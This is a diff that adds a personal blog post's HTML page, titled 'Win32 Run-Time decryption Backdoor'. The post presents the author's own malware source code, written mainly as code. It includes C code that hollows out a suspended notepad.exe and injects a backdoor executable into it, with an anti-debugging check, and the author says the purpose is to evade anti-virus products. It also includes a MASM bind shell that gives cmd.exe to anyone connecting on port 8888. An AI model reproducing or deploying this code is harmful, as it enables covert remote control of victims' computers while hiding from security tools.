@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <title>Win32 Run-Time decryption Backdoor</title>
+
+    <meta name="apple-mobile-web-app-title" content="Win32 Run-Time decryption Backdoor">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="../assets/img/apple-touch-icon.png@v=deb4239dad">
+    <link rel="icon" type="image/png" sizes="32x32" href="../assets/img/favicon-32x32.png@v=deb4239dad">
+    <link rel="icon" type="image/png" sizes="16x16" href="../assets/img/favicon-16x16.png@v=deb4239dad">
+    <link rel="shortcut icon" href="../favicon.ico">
+
+    <link rel="stylesheet" href="http://fonts.googleapis.com/css?subset=latin,cyrillic-ext,latin-ext,cyrillic&amp;family=Open+Sans+Condensed:300|Merriweather:400,300,300italic,400italic,700,700italic|Roboto+Slab:400,300">
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css">
+
+    <style type="text/css">
+    a, a:visited {color: #33cc99;}
+    .pagination a {color: #33cc99;}
+    .gist .gist-file .gist-meta a:visited {color: #33cc99 !important;}
+
+    a:focus, a:hover {color: #178b6b;}
+    h1.post-title a:focus, h1.post-title a:hover, h1.blog-title a:focus, h1.blog-title a:hover {color: #178b6b;}
+    .older-posts:hover, .newer-posts:hover {color: #178b6b;}
+</style>
+
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/github.min.css">
+    <link rel="stylesheet" href="../assets/css/steam.css@v=deb4239dad.css">
+
+
+    
+    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="Mohamed Ali Mrabet " />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Win32 Run-Time decryption Backdoor" />
+    <meta property="og:description" content="Well , I had to code my own backdoor from the scratch , which  it has proven to be successful in evading almost all anti-virus products since it takes advantage of the process-replacement technique . Basically , process-replacement is the act of creating a system process (e.g : csrss.exe) in  suspended state , and" />
+    <meta property="og:url" content="http://localhost:2368/win32-run-time-decryption-backdoor/" />
+    <meta property="article:published_time" content="2019-08-01T04:19:16.000Z" />
+    <meta property="article:modified_time" content="2019-08-01T04:40:43.000Z" />
+    <meta property="article:publisher" content="https://www.facebook.com/dali.mrabet.3" />
+    <meta property="article:author" content="https://www.facebook.com/dali.mrabet.3" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Win32 Run-Time decryption Backdoor" />
+    <meta name="twitter:description" content="Well , I had to code my own backdoor from the scratch , which  it has proven to be successful in evading almost all anti-virus products since it takes advantage of the process-replacement technique . Basically , process-replacement is the act of creating a system process (e.g : csrss.exe) in  suspended state , and" />
+    <meta name="twitter:url" content="http://localhost:2368/win32-run-time-decryption-backdoor/" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="mohamed ali MRABET" />
+    <meta name="twitter:site" content="@Mrabet_Dali" />
+    <meta name="twitter:creator" content="@Mrabet_Dali" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Mohamed Ali Mrabet ",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/favicon.ico",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "mohamed ali MRABET",
+        "url": "http://localhost:2368/author/mohamed/",
+        "sameAs": [
+            "https://www.facebook.com/dali.mrabet.3",
+            "https://twitter.com/Mrabet_Dali"
+        ]
+    },
+    "headline": "Win32 Run-Time decryption Backdoor",
+    "url": "http://localhost:2368/win32-run-time-decryption-backdoor/",
+    "datePublished": "2019-08-01T04:19:16.000Z",
+    "dateModified": "2019-08-01T04:40:43.000Z",
+    "description": "Well , I had to code my own backdoor from the scratch , which  it has proven to be successful in evading almost all anti-virus products since it takes advantage of the process-replacement technique . Basically , process-replacement is the act of creating a system process (e.g : csrss.exe) in  suspended state , and",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 2.26" />
+    <link rel="alternate" type="application/rss+xml" title="Mohamed Ali Mrabet " href="../rss/index.html" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/themes/prism.min.css" />
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/plugins/line-numbers/prism-line-numbers.min.css" />
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/themes/prism-coy.min.css" />
+</head>
+<body class="post-template">
+
+    <header id="site-head">
+        <h1 class="blog-title"><a href="../index.html">Mohamed Ali Mrabet </a></h1>
+        <h1 class="blog-subtitle">Thoughts, stories and ideas.</h1>
+    </header>
+
+        <nav class="menu" role="nav">
+        <ul>
+                    <li class="nav-home"><a href="../index.html">Home</a></li>
+                    <li class="nav-github"><a href="https://github.com/dali-mrabet">github</a></li>
+        </ul>
+    </nav>
+
+
+    <main class="content" role="main">
+    <article class="post">
+        <header>
+        <h1 class="post-title">Win32 Run-Time decryption Backdoor</h1>
+        <div class="post-meta"><time datetime="2019-08-01">01 August 2019</time></div>
+        </header>
+        <section class="post-content">
+            <!--kg-card-begin: markdown--><p>Well , I had to code my own backdoor from the scratch , which  it has proven to be successful in evading almost all anti-virus products since it takes advantage of the process-replacement technique .<br>
+Basically , process-replacement is the act of creating a system process (e.g : csrss.exe) in  suspended state , and then unmaps (deallocate) that process  adresss space by calling <strong>NtUnmapViewOfsection()</strong> and maps the backdoor's content in it , and finally resuming that process execution with <strong>ResumeThread()</strong> ,  hence this is  definitely a good strategy to bypass anti-virus detection due to the fact that the backdoor is executed in the context of a legitimate system process .<br>
+Here is the process-replacement code :</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+
+#include <a><stdio.h></a>
+#include <Windows.h>
+
+#define myExitError(msg) fprintf(stderr, \
+                                "%s  , (Error : %x )\n" , msg \
+                                 , GetLastError() ) ;\
+                         ExitProcess(-1); \
+
+
+#define NT_SUCCESS 0x00000000
+
+
+typedef    ( * NtUnmapViewOfSection)     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress );
+typedef    ( * NtWriteVirtualMemory)     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress , IN PVOID Buffer , IN ULONG NumberOfBytesToWrite, OUT PULONG NumberOfBytesWritten OPTIONAL );
+typedef    ( * NtReadVirtualMemory )     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress , OUT PVOID  Buffer, IN ULONG NumberOfBytesToRead,OUT PULONG NumberOfBytesReaded OPTIONAL   );
+typedef    ( * NtResumeThread )          ( IN HANDLE  ThreadHandle,  OUT PULONG SuspendCount OPTIONAL ) ;
+typedef    ( * NtGetContextThread)       ( IN HANDLE  ThreadHandle , OUT PCONTEXT pContext );
+typedef    ( * NtSetContextThread)       ( IN HANDLE  ThreadHandle, IN PCONTEXT Context );
+typedef    ( * NtQueryInformationProcess)( HANDLE ,   UINT ,PVOID ,ULONG , PULONG);
+
+
+
+int main(int argc,char* argv[])
+{
+
+    NtUnmapViewOfSection    myNtUnmapViewOfSection ;
+    NtReadVirtualMemory     myNtReadVirtualMemory  ;
+    NtWriteVirtualMemory    myNtWriteVirtualMemory ;
+    NtResumeThread          myNtResumeThread;
+    NtGetContextThread      myNtGetContextThread;
+    NtSetContextThread      myNtSetContextThread ;
+    NtQueryInformationProcess myNtQueryInformationProcess ;
+
+
+    HMODULE dll = LoadLibraryA("ntdll.dll");
+    myNtUnmapViewOfSection    = (NtUnmapViewOfSection)GetProcAddress(dll,"NtUnmapViewOfSection");
+    myNtReadVirtualMemory     = (NtReadVirtualMemory )GetProcAddress(dll,"NtReadVirtualMemory");
+    myNtWriteVirtualMemory    = (NtWriteVirtualMemory)GetProcAddress(dll,"NtWriteVirtualMemory");
+    myNtSetContextThread      = (NtSetContextThread)GetProcAddress(dll,"NtSetContextThread");
+    myNtGetContextThread      = (NtGetContextThread)GetProcAddress(dll,"NtGetContextThread");
+    myNtResumeThread          = (NtResumeThread)GetProcAddress(dll,"NtResumeThread");
+    myNtQueryInformationProcess =(NtQueryInformationProcess)GetProcAddress(dll,"NtQueryInformationProcess");
+
+
+    PVOID MyExe,Allocated,BaseAddrOfSuspendedProcess;
+    DWORD i,read,noDebuginherit = 0,nSizeOfFile;
+    HANDLE hMyExe ;
+    IMAGE_DOS_HEADER * IDH;
+    IMAGE_NT_HEADERS  * INH;
+    IMAGE_SECTION_HEADER  * ISH;
+    STARTUPINFO StartInfo;
+    PROCESS_INFORMATION ProcInfo;
+    CONTEXT ThreadContext;;
+
+    memset(&StartInfo,0,sizeof(StartInfo));
+    memset(&ProcInfo,0,sizeof(ProcInfo));
+
+    if((myNtQueryInformationProcess(GetCurrentProcess(),0x7,&noDebuginherit,4,NULL)) != NT_SUCCESS )
+    {
+        ExitProcess(-1);
+    }
+
+    if(!CreateProcess(NULL,"C:\\windows\\system32\\notepad.exe",NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&StartInfo,&ProcInfo))
+    {
+        myExitError("Error in creating a target process in suspended state ");
+    }
+
+    ThreadContext.ContextFlags=CONTEXT_FULL;
+    hMyExe=CreateFile("myBackdoor.exe",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+
+    if(hMyExe==INVALID_HANDLE_VALUE)
+    {
+        myExitError(" Cannot open The Backdoor ");
+    }
+
+    nSizeOfFile=GetFileSize(hMyExe,NULL);
+
+    MyExe = VirtualAlloc(NULL,nSizeOfFile,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+
+    ReadFile(hMyExe,MyExe,nSizeOfFile,&read,NULL) ;
+
+
+    IDH=(PIMAGE_DOS_HEADER)MyExe;
+
+    INH=(PIMAGE_NT_HEADERS)((LPBYTE)MyExe+IDH->e_lfanew);
+
+    myNtGetContextThread(ProcInfo.hThread,&ThreadContext);
+    myNtReadVirtualMemory(ProcInfo.hProcess,(PVOID)(ThreadContext.Ebx+8),&BaseAddrOfSuspendedProcess,sizeof(PVOID),NULL);
+
+    if((DWORD)BaseAddrOfSuspendedProcess == INH->OptionalHeader.ImageBase)
+    {
+        myNtUnmapViewOfSection(ProcInfo.hProcess,BaseAddrOfSuspendedProcess);
+        printf("Unmapping Target Exe starting from %x \n",BaseAddrOfSuspendedProcess);
+    }
+
+    Allocated=VirtualAllocEx(ProcInfo.hProcess,(PVOID)INH->OptionalHeader.ImageBase,INH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE); 
+
+    if(Allocated != INH->OptionalHeader.ImageBase)
+    {
+        printf("Cannot allocate memory in at %X in target process !! \n",INH->OptionalHeader.ImageBase);
+        ExitProcess(-1);
+    }
+
+    if(myNtWriteVirtualMemory(ProcInfo.hProcess,Allocated,MyExe,INH->OptionalHeader.SizeOfHeaders,NULL) != NT_SUCCESS )
+    {
+        myExitError("Cannot write in target address space ");
+    }
+
+    for(i=0; i<INH->FileHeader.NumberOfSections; i++)
+    {
+        ISH=(PIMAGE_SECTION_HEADER)((LPBYTE)MyExe+IDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(i*sizeof(IMAGE_SECTION_HEADER)));
+        myNtWriteVirtualMemory(ProcInfo.hProcess,(PVOID)((LPBYTE)Allocated+ISH->VirtualAddress),(PVOID)((LPBYTE)MyExe+ISH->PointerToRawData),ISH->SizeOfRawData,NULL); 
+    }
+
+    ThreadContext.Eax=(DWORD)((LPBYTE)Allocated+INH->OptionalHeader.AddressOfEntryPoint);
+
+    printf(" New entry point: %x \n",ThreadContext.Eax);
+
+    myNtWriteVirtualMemory(ProcInfo.hProcess,(PVOID)(ThreadContext.Ebx+8),&INH->OptionalHeader.ImageBase,sizeof(PVOID),NULL);
+
+    myNtSetContextThread(ProcInfo.hThread,&ThreadContext);
+
+    if(myNtResumeThread(ProcInfo.hThread,NULL) != NT_SUCCESS )
+    {
+        myExitError("Cannot Resume Thread ");
+    }
+
+
+
+    return 0;
+}
+</code></pre> <!--kg-card-end: html--><!--kg-card-begin: markdown--><p>Because the size matters , then I decided to code the backdoor in assembly (MASM):</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c"> 
+.386
+.model flat,stdcall
+option casemap:none
+
+;------------Block 2----------
+include windows.inc
+include user32.inc
+includelib user32.lib
+include kernel32.inc
+includelib kernel32.lib
+includelib ws2_32.lib
+include ws2_32.inc
+
+
+.data
+msg db "message",0
+msg1 db "title",0
+error db "error",0
+binderror db "cannot bind",0
+cmd db "cmd.exe",0
+processerror db "cannot create process",0
+sockerror db "error in creating a socket ",0
+er db "%d-",0
+
+
+.data? 
+sa WSADATA <>
+pi PROCESS_INFORMATION <>
+sii STARTUPINFO <>
+client  sockaddr_in <> 
+sock HANDLE ?
+newsock HANDLE ? 
+sizee DWORD ?
+sec db 32 dup(?)
+
+
+.code 
+start : 
+mov eax , offset sii.cb
+mov dword ptr [eax] , 0
+xor eax ,eax 
+mov eax , offset sii.dwFlags 
+mov dword ptr [eax] , STARTF_USESTDHANDLES 
+mov ecx , sizeof(PROCESS_INFORMATION)
+mov eax , offset pi
+zero : 
+mov byte ptr [eax], 0
+dec eax
+dec ecx 
+cmp ecx ,0
+jne zero
+
+invoke WSAStartup ,101h ,addr sa ;0x202 is makeword(2,2) 
+
+invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL
+
+.if eax == -1 
+   invoke MessageBox,NULL, addr sockerror ,addr error,NULL 
+   invoke GetLastError
+   invoke wsprintf,addr sec , addr er , eax  
+   invoke ExitProcess,-1
+.endif
+
+ mov sock ,eax 
+ mov [client.sin_family] ,AF_INET 
+ mov  dword ptr [client.sin_port] , htons(8888) ; port 24628 
+ mov [client.sin_addr]  , INADDR_ANY
+ 
+invoke bind,sock ,ADDR client , SIZEOF client
+.if eax != 0 
+  invoke MessageBox,NULL, addr binderror ,addr error , NULL 
+   invoke GetLastError
+  invoke wsprintf,addr sec , addr er , eax
+  invoke ExitProcess,-1
+ .endif
+ 
+ 
+invoke listen,sock,5
+  xor eax ,eax 
+  mov sizee , 10h 
+
+  invoke accept,sock , addr client ,addr sizee 
+  
+  mov newsock,eax 
+  mov [sii.hStdError]  , eax
+
+
+mov [sii.hStdInput]   , eax
+  mov [sii.hStdOutput] , eax 
+  
+ 
+  invoke CreateProcess,NULL,addr cmd , 0,0,TRUE,0,0,0,addr sii,addr pi
+  cmp eax , 0 
+  jne success 
+  invoke MessageBox,NULL, addr processerror ,addr error ,NULL 
+  
+  success : 
+
+  xor eax,eax 
+  invoke ExitProcess,NULL  
+
+end start 
+</code></pre> <!--kg-card-end: html-->
+        </section>
+        <section class="post-tags">
+            
+        </section>
+        <section class="share">
+            <p class="backtotop"><a data-scroll href="index.html#site-head"><i class="fa fa-lg fa-fw fa-angle-double-up"></i></a><a data-scroll class="backtotoptext" href="index.html#site-head"> Back to top</a></p>
+            <p class="info prompt">Share</p>
+            <a href="http://twitter.com/share?text=Win32 Run-Time decryption Backdoor&url=http://localhost:2368/win32-run-time-decryption-backdoor/" title="Share on Twitter"
+                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fa fa-2x fa-fw fa-twitter-square"></i> <span class="hidden">Twitter</span>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:2368/win32-run-time-decryption-backdoor/" title="Share on Facebook"
+                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                <i class="fa fa-2x fa-fw fa-facebook-square" style="margin-left: -8px"></i> <span class="hidden">Facebook</span>
+            </a>
+            <a href="https://plus.google.com/share?url=http://localhost:2368/win32-run-time-decryption-backdoor/" title="Share on Google+"
+               onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                <i class="fa fa-2x fa-fw fa-google-plus-square" style="margin-left: -8px"></i> <span class="hidden">Google+</span>
+            </a>
+        </section>
+        <footer class="post-footer">
+            <section class="author">
+        <div class="authorimage" style="background: url(../assets/img/default-avatar.png@v=deb4239dad)"></div>
+    <h4 class="author-name">mohamed ali MRABET</h4>
+    <p class="bio"></p>
+    <p class="meta">
+      
+      <i class="fa fa-fw fa-map-marker"></i> Montreal,Quebec
+    </p>
+</section>
+        </footer>
+
+    </article>
+</main>
+
+
+    <footer class="site-footer">
+        <div class="inner">
+            <section class="footer-social">
+        <a href="https://www.facebook.com/dali.mrabet.3" target="_blank" rel="noopener" title="Facebook"><i class="fa fa-2x fa-fw fa-facebook"></i> <span class="hidden">Facebook</span></a>
+        <a href="https://twitter.com/Mrabet_Dali" target="_blank" rel="noopener" title="Twitter"><i class="fa fa-2x fa-fw fa-twitter"></i> <span class="hidden">Twitter</span></a>
+    <a href="../rss/index.html" target="_blank" rel="noopener" title="RSS"><i class="fa fa-2x fa-fw fa-rss"></i> <span class="hidden">RSS</span></a>
+</section>
+            <section class="footer-author">A blog by <a href="mailto:author@example.com">Author Name</a></section>
+            <section class="copyright">&copy; 2019 <a href="../index.html">Mohamed Ali Mrabet </a>. All rights reserved</section>
+            <section class="theme"><a href="https://github.com/epistrephein/Steam" target="_blank" rel="noopener">Steam theme</a> by Tommaso Barbato</section>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-csharp.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-css.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-clike.min.js"></script>
+<!-- Add additional languages here -->
+
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/smooth-scroll/9.4.3/js/smooth-scroll.min.js"></script>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
+    <script src="../assets/js/steam.js@v=deb4239dad"></script>
+</body>
+</html>
